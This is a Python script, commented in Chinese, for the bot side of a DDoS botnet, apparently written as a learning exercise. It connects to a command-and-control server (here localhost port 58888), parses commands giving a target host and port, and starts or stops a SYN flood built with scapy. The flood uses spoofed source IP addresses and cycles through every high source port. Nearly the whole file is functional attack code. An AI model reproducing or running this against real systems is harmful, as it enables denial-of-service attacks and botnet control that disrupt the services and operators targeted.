#!/usr/bin/python
# coding:utf8


import argparse
import socket
import sys
import os
from multiprocessing import Process
import random
from scapy.all import * 
from scapy.layers.inet import *

curProcess = None
 
#  SYN泛洪攻击，就是最开始的那串代码，直接copy过来就好
def synFlood(tgt, dPort):
    print("="*100)
    print("The syn flood is running")
    print('='*100)
 
    srcList = ['11.1.1.2', '10.1.1.102', '33.1.1.2',
               '125.130.5.199']
    #  任意一个端口号
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
 
def cmdHandle(sock, parser):
    global curProcess
    while True:
        data = sock.recv(1024).decode()
        if len(data) == 0:
            print('The data is empty')
            return
        if data[0] == '#':
            try:
                # 解析命令
                options = parser.parse_args(data[1:].split())
 
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd
                print(m_cmd)
 
                #  DDOS启动命令
                if m_cmd.lower() == 'start':
                    if curProcess !=None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('The synFlood is start')
                    p = Process(target=synFlood, args = (m_host, m_port))
                    p.start()
                    curProcess = p
                elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print("Failed to perform the command")
 
 
def main():
    #  添加需要解析的命令，就是服务器发送过来的命令
    #  命令格式："#-H xxx.xxx.xxx.xxx -p xxxx -c start"
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest='host', type=str)
    p.add_argument('-p', dest='port', type=int)
    p.add_argument('-c', dest='cmd', type=str)
    print("*" * 40)
 
    try:
        #  创建socket对象
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 这里因为是在本地，所以连接的ip地址为本地ip地址127.0.0.1，端口为服务器端口       
        s.connect(('127.0.0.1',58888))  
        
        print('To connected server was success')
        print("=" * 40)
 
        #  处理命令
        cmdHandle(s, p)
 
    except Exception as e:
        print('The network connected failed')
        print('please restart the script')
        sys.exit(0)
 
 
if __name__ == '__main__':
    main()